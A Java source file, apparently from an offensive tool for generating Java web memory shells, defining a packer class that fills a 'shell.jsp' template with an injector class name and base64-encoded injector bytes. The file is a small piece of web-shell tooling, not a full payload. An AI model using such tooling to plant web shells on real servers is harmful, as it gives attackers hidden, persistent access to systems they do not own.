package com.reajason.javaweb.memshell.packer.jsp;

import com.reajason.javaweb.memshell.config.GenerateResult;
import com.reajason.javaweb.memshell.packer.Packer;
import lombok.SneakyThrows;
import org.apache.commons.io.IOUtils;

import java.nio.charset.Charset;
import java.util.Objects;

/**
 * @author ReaJason
 * @since 2024/11/26
 */
public class DefalutJspPacker implements Packer {

    String jspTemplate = null;

    public DefalutJspPacker() {
        try {
            jspTemplate = IOUtils.toString(Objects.requireNonNull(this.getClass().getResourceAsStream("/shell.jsp")), Charset.defaultCharset());
        } catch (Exception ignored) {

        }
    }

    @Override
    @SneakyThrows
    public String pack(GenerateResult generateResult) {
        String injectorBytesBase64Str = generateResult.getInjectorBytesBase64Str();
        String injectorClassName = generateResult.getInjectorClassName();
        return jspTemplate.replace("{{className}}", injectorClassName).replace("{{base64Str}}", injectorBytesBase64Str);
    }
}